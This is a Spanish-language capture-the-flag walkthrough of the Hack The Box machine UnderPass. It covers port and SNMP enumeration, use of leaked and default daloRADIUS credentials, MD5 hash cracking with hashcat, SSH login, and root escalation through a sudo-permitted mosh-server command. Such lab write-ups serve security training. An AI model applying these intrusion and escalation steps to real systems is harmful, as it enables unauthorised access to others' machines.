---
hidden: true
noIndex: true
icon: desktop
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Copy of gzzcooUnderPass

<figure><img src="../../.gitbook/assets/UnderPass (1).png" alt="" width="563"><figcaption></figcaption></figure>

***

## Reconnaissance

Realizaremos un reconocimiento con `Nmap` para ver los puertos que están expuestos en la máquina **`UnderPass`**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.

```bash
❯ nmap -p- --open -sS --min-rate 1000 -vvv -Pn -n 10.10.11.48 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 06:43 CET
Initiating SYN Stealth Scan at 06:43
Scanning 10.10.11.48 [65535 ports]
Discovered open port 22/tcp on 10.10.11.48
Discovered open port 80/tcp on 10.10.11.48
Completed SYN Stealth Scan at 06:43, 11.74s elapsed (65535 total ports)
Nmap scan report for 10.10.11.48
Host is up, received user-set (0.046s latency).
Scanned at 2025-01-20 06:43:38 CET for 12s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 11.86 seconds
           Raw packets sent: 65535 (2.884MB) | Rcvd: 65541 (2.622MB)
```

A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.

```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.10.11.48
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato `oN` y `oX` para posteriormente trabajar con ellos. Verificamos que al parecer se trata de una máquina Ubuntu que dispone de una página `Apache` y servicio `SSH`.

```bash
❯ nmap -sCV -p22,80 10.10.11.48 -A -oN targeted -oX targetedXML
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 06:45 CET
Nmap scan report for underpass.htb (10.10.11.48)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   80.87 ms 10.10.16.1
2   42.34 ms underpass.htb (10.10.11.48)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.27 secondss
```

Al intentar acceder a[ http://10.10.11.48](http://10.10.11.48), verificamos que se trata de la página web de `Apache` que viene por defecto.

<figure><img src="../../.gitbook/assets/imagen (194).png" alt="" width="563"><figcaption></figcaption></figure>

Al intentar enumerar posibles directorios en el sitio web, no logramos encontrar nada interesante.

```bash
❯ dirsearch -u http://10.10.11.48 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/UnderPass/UnderPass/nmap/reports/http_10.10.11.48/_25-01-20_06-46-56.txt

Target: http://10.10.11.48/

[06:46:56] Starting: 
[06:46:59] 403 -  276B  - /.ht_wsr.txt
[06:47:00] 403 -  276B  - /.htaccess.bak1
[06:47:00] 403 -  276B  - /.htaccess.sample
[06:47:00] 403 -  276B  - /.htaccess_extra
[06:47:00] 403 -  276B  - /.htaccess.orig
```

Realizamos _**fuzzing**_ para enumerar subdominios del sitio web, en este caso, sin resultado ninguno obtenido.

```bash
❯ wfuzz -c --hc=404,400 --hw=28 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -H "Host: FUZZ.10.10.11.48" http://10.10.11.48 2>/dev/null
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.11.48/
Total requests: 220546

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                           
=====================================================================


Total time: 24.03940
Processed Requests: 3644
Filtered Requests: 3644
Requests/sec.: 151.5844
```

### Enumerating UDP Ports with Nmap

En este punto de reconocimiento inicial, nos encontramos que había una página web en el puerto 80 (HTTP) que no contenía ningún tipo de información, ni directorios, subdominios, archivos, etc.

Intentamos volver a enumerar los puertos que se encontrasen abiertos en la máquina víctima, pero esta vez intentando enumerar puertos `UDP` en vez de `TCP`.

Al realizar el escaneo de puertos UDP con la herramienta de `Nmap`, verificamos que hemos logrado localizar más puertos abiertos en el equipo que con el escaneo principal no logramos enumerar.

```bash
❯ nmap --top-ports 100 --open -sU -vvv -Pn -n 10.10.11.48
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 06:49 CET
Initiating UDP Scan at 06:49
Scanning 10.10.11.48 [100 ports]
Increasing send delay for 10.10.11.48 from 0 to 50 due to max_successful_tryno increase to 4
Discovered open port 161/udp on 10.10.11.48
Increasing send delay for 10.10.11.48 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.11.48 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 10.10.11.48 from 200 to 400 due to max_successful_tryno increase to 7
Increasing send delay for 10.10.11.48 from 400 to 800 due to max_successful_tryno increase to 8
Increasing send delay for 10.10.11.48 from 800 to 1000 due to 11 out of 12 dropped probes since last increase.
Completed UDP Scan at 06:51, 94.37s elapsed (100 total ports)
Nmap scan report for 10.10.11.48
Host is up, received user-set (0.028s latency).
Scanned at 2025-01-20 06:49:33 CET for 94s
Not shown: 97 closed udp ports (port-unreach)
PORT     STATE         SERVICE REASON
161/udp  open          snmp    udp-response ttl 63
1812/udp open|filtered radius  no-response
1813/udp open|filtered radacct no-response

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 94.45 seconds
           Raw packets sent: 379 (20.698KB) | Rcvd: 157 (13.283KB)
```

En la enumeración de los puertos UDP, nos encontramos que el `SNMP` (puerto 161) se encontraba expuesto. A través de la herramienta de `snmp-check`, lo que intentamos realizar es un análisis de la red para verificar y obtener información sobre dispositivos a través del protocolo `SNMP`.

En el resultado obtenido, logramos obtener más información. Entre las cuales, podemos verificar que el hostname `UnDerPass.htb` es el único `daloradius server`.

{% hint style="info" %}
SNMP significa Simple Network Management Protocol, por sus siglas en inglés. Se trata de un protocolo para la gestión de la transferencia de información en redes, especialmente para uso en LAN, dependiendo de la versión elegida.
{% endhint %}

```bash
❯ snmp-check 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 00:10:51.77
  Uptime system                 : 00:10:41.84
  System date                   : 2025-1-19 23:08:12.0
```

Añadiremos en nuestro archivo `/etc/hosts` la entrada correspondiente.

```bash
❯ catnp /etc/hosts | grep 10.10.11.48
10.10.11.48 underpass.htb
```

## Daloradius Access

En la enumeración de puertos UDP, también nos encontramos que había un puerto 1812 del servicio de `daloradius`. Al intentar acceder a [http://underpass.htb/daloradius](http://underpass.htb/daloradius) no logramos acceder por falta de permisos.

{% hint style="info" %}
**Daloradius** es una interfaz web de administración utilizada para gestionar servidores **FreeRADIUS** y **PHP-Freeradius**. Es una herramienta práctica para la configuración y administración de sistemas RADIUS (Remote Authentication Dial-In User Service), que se utiliza principalmente para la autenticación, autorización y accounting (AAA) en redes, como en proveedores de Internet (ISPs), sistemas de acceso Wi-Fi, VPNs, y otras soluciones que requieren un control centralizado de usuarios.
{% endhint %}

<figure><img src="../../.gitbook/assets/imagen (195).png" alt="" width="407"><figcaption></figcaption></figure>

Procedemos a enumerar posibles páginas web y directorios de la URL http://underpass.htb/daloradius, nos encontramos que hemos logrado encontrar un archivo llamado `.gitignore`, un directorio que podríamos investigar llamado `app` y un archivo que podría disponer de configuraciones nombrado `docker-compose.yml`.

```bash
❯ dirsearch -u http://underpass.htb/daloradius -t 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/UnderPass/UnderPass/nmap/reports/http_underpass.htb/_daloradius_25-01-20_06-55-48.txt

Target: http://underpass.htb/

[06:55:48] Starting: daloradius/
[06:55:50] 200 -  221B  - /daloradius/.gitignore
[06:56:02] 301 -  323B  - /daloradius/app  ->  http://underpass.htb/daloradius/app/
[06:56:07] 200 -   24KB - /daloradius/ChangeLog
[06:56:14] 200 -    2KB - /daloradius/Dockerfile
[06:56:13] 301 -  323B  - /daloradius/doc  ->  http://underpass.htb/daloradius/doc/
[06:56:13] 200 -    2KB - /daloradius/docker-compose.yml
```

Al revisar el contenido del archivo `.gitignore`, nos encontramos con el siguiente contenido. Podríamos investigar si disponemos acceso a los recursos que mencionan.

```bash
❯ curl -s -X GET 'http://underpass.htb/daloradius/.gitignore'
.idea/
*.log
*.db
invoice_preview.html
.DS_Store
data/
internal_data/

var/log/*.log
var/backup/*.sql
app/common/includes/daloradius.conf.php
app/common/library/htmlpurifier/HTMLPurifier/DefinitionCache/Serializer/HTML/*
```

Al revisar el archivo `docker-compose.yml`, también logramos verificar configuraciones, usuarios y contraseñas, veremos si más adelante podemos utilizar esta información obtenida.

```bash
❯ curl -s -X GET 'http://underpass.htb/daloradius/docker-compose.yml'
version: "3"

services:

  radius-mysql:
    image: mariadb:10
    container_name: radius-mysql
    restart: unless-stopped
    environment:
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      - MYSQL_ROOT_PASSWORD=radiusrootdbpw
    volumes:
      - "./data/mysql:/var/lib/mysql"

  radius:
    container_name: radius
    build:
      context: .
      dockerfile: Dockerfile-freeradius
    restart: unless-stopped
    depends_on: 
      - radius-mysql
    ports:
      - '1812:1812/udp'
      - '1813:1813/udp'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional settings
      - DEFAULT_CLIENT_SECRET=testing123
    volumes:
      - ./data/freeradius:/data
    # If you want to disable debug output, remove the command parameter
    command: -X

  radius-web:
    build: .
    container_name: radius-web
    restart: unless-stopped
    depends_on:
      - radius
      - radius-mysql
    ports:
      - '80:80'
      - '8000:8000'
    environment:
      - MYSQL_HOST=radius-mysql
      - MYSQL_PORT=3306
      - MYSQL_DATABASE=radius
      - MYSQL_USER=radius
      - MYSQL_PASSWORD=radiusdbpw
      # Optional Settings:
      - DEFAULT_CLIENT_SECRET=testing123
      - DEFAULT_FREERADIUS_SERVER=radius
      - MAIL_SMTPADDR=127.0.0.1
      - MAIL_PORT=25
      - MAIL_FROM=root@daloradius.xdsl.by
      - MAIL_AUTH=

    volumes:
      - ./data/daloradius:/data
```

Realizamos de nuevo una nueva enumeración, pero esta vez de la URL [http://underpass.htb/daloradius/app](http://underpass.htb/daloradius/app). En el resultado obtenido, nos muestra lo que parece ser una página de inicio de sesión y otro directorio llamado `common`.

```bash
❯ dirsearch -u http://underpass.htb/daloradius/app -t 200 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 11460

Output File: /home/kali/Desktop/HackTheBox/Linux/UnderPass/UnderPass/nmap/reports/http_underpass.htb/_daloradius_app_25-01-20_06-59-04.txt

Target: http://underpass.htb/

[06:59:04] Starting: daloradius/app/
[06:59:24] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[06:59:58] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[06:59:58] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[06:59:58] 200 -    2KB - /daloradius/app/users/login.php

Task Completed
```

Realizando una búsqueda por Internet, verificamos que las credenciales por defecto del acceso al servidor `RADIUS` son las siguientes.

<figure><img src="../../.gitbook/assets/imagen (196).png" alt=""><figcaption></figcaption></figure>

Probaremos de intentar acceder al panel de inicio de sesión que nos encontramos [http://underpass.htb/daloradius/app/users/login.php](http://underpass.htb/daloradius/app/users/login.php). En este caso, no logramos acceder a la plataforma.

<figure><img src="../../.gitbook/assets/imagen (197).png" alt="" width="563"><figcaption></figcaption></figure>

Realizando nuevamente una enumeración de directorios de [http://underpass.htb/daloradius/app](http://underpass.htb/daloradius/app) con un diccionario más grande, logramos localizar un nuevo directorio llamado `operators.`

```bash
❯ dirsearch -u http://underpass.htb/daloradius/app/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 2>/dev/null

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 200 | Wordlist size: 220545

Output File: /home/kali/Desktop/HackTheBox/Linux/UnderPass/UnderPass/nmap/reports/http_underpass.htb/_daloradius_app__25-01-20_07-20-06.txt

Target: http://underpass.htb/

[07:20:06] Starting: daloradius/app/
[07:20:07] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[07:20:13] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[07:20:33] 301 -  333B  - /daloradius/app/operators  ->  http://underpass.htb/daloradius/app/operators/
```

Al acceder a http://underpass.htb/daloradius/app/operators, verificamos que se trata de un panel de inicio de sesión de `RADIUS`, probaremos nuevamente si podemos autenticarnos con las credenciales que vienen por defecto en los servidores `RADIUS`.

<figure><img src="../../.gitbook/assets/imagen (200).png" alt="" width="563"><figcaption></figcaption></figure>

Verificamos que hemos logrado acceder correctamente al panel de `DALORADIUS`.

<figure><img src="../../.gitbook/assets/imagen (201).png" alt=""><figcaption></figcaption></figure>

## Initial Access

Al revisar los diferentes apartados de la página web de `DALORADIUS`, nos encontramos con el apartado de `Management < Users < List Users` en el cual aparece al usuario `svcMosh` con unas credenciales en formato hash. --> [http://underpass.htb/daloradius/app/operators/mng-list-all.php](http://underpass.htb/daloradius/app/operators/mng-list-all.php)&#x20;

<figure><img src="../../.gitbook/assets/imagen (202).png" alt=""><figcaption></figcaption></figure>

### Cracking hashes

Por el formato del hash, podemos deducir que se trata de un hash `MD5`. Procedemos a crackear el hash obtenido y logramos crackear la contraseña y obtenerla en texto plano.

```bash
❯ hashid '412DD4759978ACFCC81DEAB01B382403'
Analyzing '412DD4759978ACFCC81DEAB01B382403'
[+] MD2 
[+] MD5 

❯ hashcat -a 0 -m 0 hashes /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

...[snip]...

412dd4759978acfcc81deab01b382403:underwaterfriends  
```

### Accessing to SSH with password cracked

Probaremos de acceder al equipo a través de SSH con las credenciales obtenidas. Logramos acceder y verificar la flag de **user.txt**.

```bash
❯ ssh svcMosh@10.10.11.48
svcMosh@10.10.11.48's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

...[snip]...

Last login: Sat Jan 11 13:29:47 2025 from 10.10.14.62
svcMosh@underpass:~$ cat user.txt 
7805fc3f0d**********************
```

## Privilege Escalation

### Abusing sudoers privileges (mosh-server)

Al revisar si el usuario que disponemos tiene algún privilegio de `sudoers`, nos encontramos que puede ejecutar como usuario`root` el binario `/usr/bin/mosh-server`.

{% hint style="info" %}
Mosh, el acrónimo de **Mobile Shell**, es una aplicación (en linea de comandos) que es usada para conectarse a un servidor desde un ordenador o dispositivo cliente, a traves de la red. Puede usarse como SSH y contiene algunas características adicionales al SSH. Es una aplicación escrita por Keith Winstein, para sistemas UNIX, bajo licencia GNU GPL v3.
{% endhint %}

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Al ejecutar el servidor Mosh como `root`, ahora el usuario `svcMosh` tiene una shell con permisos de `root`. Esto permite al atacante acceder a todos los recursos del sistema con permisos completos, incluyendo la capacidad de modificar archivos, instalar software, y ejecutar comandos con total libertad.

Básicamente, lo que realizamos es montar un servidor `Mosh` con privilegios de `root` en el `localhost`, para así lograr obtener acceso como usuario `root`.

Por otro lado, logramos verificar la flag de **root.txt**.

```bash
svcMosh@underpass:~$ mosh --server="sudo /usr/bin/mosh-server" localhost

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

...[snip]...

root@underpass:~$ cat root.txt 
0428fb9394b*********************
```
